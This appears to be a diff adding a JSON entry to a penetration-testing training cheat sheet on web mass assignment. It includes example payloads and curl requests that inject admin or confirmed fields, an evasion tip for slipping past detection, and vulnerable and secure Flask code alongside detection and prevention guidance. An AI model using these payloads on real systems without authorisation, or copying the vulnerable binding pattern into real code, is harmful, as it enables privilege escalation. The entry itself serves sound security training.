@@ -1,0 +1,101 @@
+{
+  "type": "payload",
+  "platform": "linux",
+  "requires": [
+    "network-access"
+  ],
+  "protocols": [
+    "http"
+  ],
+  "tools": [
+    "burpsuite"
+  ],
+  "tags": [
+    "mass-assignment",
+    "privilege-escalation"
+  ],
+  "category": "Exploitation",
+  "subcategory": "Web Mass Assignment",
+  "certifications": [
+    "CPTS",
+    "CWES",
+    "OSCP"
+  ],
+  "primary_cert": "CPTS",
+  "source": "CPTS Module 24: Attacking Common Applications",
+  "examples": [
+    {
+      "label": "Add an unexpected 'confirmed'/'admin' parameter to the request",
+      "command": "POST /register  ->  username=new&password=test&confirmed=test"
+    },
+    {
+      "label": "Rails equivalent - inject admin:true into the user object",
+      "command": "# Rails: {\"user\":{\"username\":\"hacker\",\"admin\":true}}"
+    }
+  ],
+  "notes": "The winning move is adding a parameter the form never sent (confirmed=true, admin=true, role=admin) - diff the object model against the form. Best found by reading source or guessing framework conventions.",
+  "references": [
+    {
+      "title": "OWASP - Mass Assignment",
+      "url": "https://cheatsheetseries.owasp.org/cheatsheets/Mass_Assignment_Cheat_Sheet.html"
+    },
+    {
+      "title": "HTB Academy - Attacking Common Applications",
+      "url": "https://academy.hackthebox.com/module/details/113"
+    },
+    {
+      "title": "OffSec PEN-200 - Web Application Attacks",
+      "url": "https://www.offsec.com/courses/pen-200/"
+    }
+  ],
+  "recommended": [
+    {
+      "id": "ldap-injection-authbypass",
+      "note": "Another application-logic web vuln in this module.",
+      "rel": "alternative"
+    },
+    {
+      "id": "auth-bypass-param-mod",
+      "rel": "next",
+      "note": "Continue enumeration/technique in this area"
+    }
+  ],
+  "id": "mass-assignment",
+  "name": "Web Mass Assignment - Inject Extra Parameters",
+  "command": "username=<user>&password=<pass>&confirmed=true",
+  "description": "Frameworks that bind all request params to model fields let you set attributes the form never exposed. Add a parameter like confirmed=true or admin=true to a registration/update request to self-approve or escalate.",
+  "opsec": "loud",
+  "mitre": [
+    "T1190"
+  ],
+  "exam": "exam-ok",
+  "variations": [
+    {
+      "command": "curl -s -X PATCH http://<target>/api/v1/<endpoint> -H \"Authorization: Bearer <jwt_token>\" -H \"Content-Type: application/json\" -d '{\"id\": \"<object_id>\", \"isExemptedFromMarketplaceFee\": 1}' | jq",
+      "caption": "API BOPLA: PATCH with privileged field not exposed in UI (Broken Object Property Level Auth)",
+      "label": "PATCH request"
+    },
+    {
+      "command": "curl -s -X GET http://<target>/api/v1/<endpoint>/current-user -H \"Authorization: Bearer <jwt_token>\" | jq 'keys'",
+      "caption": "Enumerate all response fields to discover mass-assignable properties",
+      "label": "GET request"
+    }
+  ],
+  "defense": {
+    "why_it_works": "Mass assignment vulnerabilities occur when a web framework automatically binds HTTP request parameters to model attributes without filtering. An attacker adds extra parameters to a registration request (e.g., 'confirmed=True', 'admin=true') that the framework maps to privileged model fields.",
+    "prerequisites": "Web framework with automatic parameter binding without allowlist enforcement. A registration or profile update endpoint.",
+    "impact": "Privilege escalation: attacker registers as admin, bypasses approval workflows, or sets internal-only fields (confirmed, role, is_admin) from a normal registration form.",
+    "detection": "Registration or update requests containing unexpected parameters not in the application's HTML form. New admin user created via registration. Parameter anomaly detection in WAF.",
+    "artifacts": "Web server access log (POST /register with extra parameters) | Application audit log (admin user created via registration) | Database: user record with admin flag set by attacker",
+    "prevention": "Use allowlists for parameter binding -- explicitly specify which fields are user-settable. In Rails: strong_parameters. In Flask: explicitly extract only required fields from request.form. Never bind all request parameters to a model.",
+    "misconfiguration": "Flask registration endpoint maps all form fields to DB columns, including 'confirmed' (approval status) which should only be set by administrators.",
+    "vulnerable_config": "# Vulnerable Flask\n@app.route('/register', methods=['POST'])\ndef register():\n    confirmed = request.form.get('confirmed', False)  # attackable\n    cur.execute('insert into users values(?,?,?)', (username, password, confirmed))",
+    "secure_config": "# Secure Flask -- hardcode non-user-settable fields\n@app.route('/register', methods=['POST'])\ndef register():\n    username = request.form['username']\n    password = request.form['password']\n    confirmed = False   # always False -- never from user input\n    cur.execute('insert into users values(?,?,?)', (username, password, confirmed))\n\n# Rails: params.require(:user).permit(:username, :email, :password)",
+    "evasion": "Add parameter in URL query string instead of POST body. Use JSON body if endpoint accepts both. Parameter pollution (send confirmed twice).",
+    "sources": [
+      "HTB M24",
+      "MITRE T1190",
+      "OWASP A01:2021"
+    ]
+  }
+}
